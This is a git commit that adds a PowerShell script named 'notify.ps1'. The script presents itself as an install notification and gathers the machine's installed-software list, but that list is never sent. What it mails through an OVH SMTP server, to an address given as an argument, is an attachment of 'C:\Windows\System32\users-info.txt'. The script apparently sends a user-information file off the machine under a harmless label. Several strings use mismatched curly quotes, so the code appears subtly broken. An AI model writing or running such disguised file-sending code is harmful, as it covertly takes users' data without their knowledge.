2274982e709cd1ad3429fa7285dccdcb380e1f72
Inf3rnus187 <inf3rnus187@gmail.com>
2025-03-21 21:07:51 +0100

    Create notify.ps1

---
+++ notify.ps1
@@ -0,0 +1,22 @@
+      $MailMessage = @{
+      To = $args[0]
+      #Bcc = "", ""
+      From = "Install Script <manuel@progiss.com>"
+      Subject = "$($env:COMPUTERNAME) - Ready"
+      Body = "<h1>File list!</h1> <p><strong>Generated:</strong> $(Get-Date -Format g)</p>”
+      Smtpserver = "ex.mail.ovh.net"
+      Port = 587
+      UseSsl = $true
+      BodyAsHtml = $true
+      Encoding = “UTF8”
+      #Attachment = “$($ENV:Temp)\installed.txt”
+      Attachment = “C:\Windows\System32\users-info.txt"
+      }
+      $list = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* |  Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Sort-Object -Property Publisher | Format-Table -AutoSize 
+      $list | Out-File -FilePath  "$($ENV:Temp)\installed.txt"
+      $text = Get-Content "$($ENV:Temp)\installed.txt"
+      $User = $args[1]
+      $Pass = $args[2]
+      $Passs= ConvertTo-SecureString -String $Pass -AsPlainText -Force
+      $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $User, $passs
+      Send-MailMessage @MailMessage -Credential $Credential
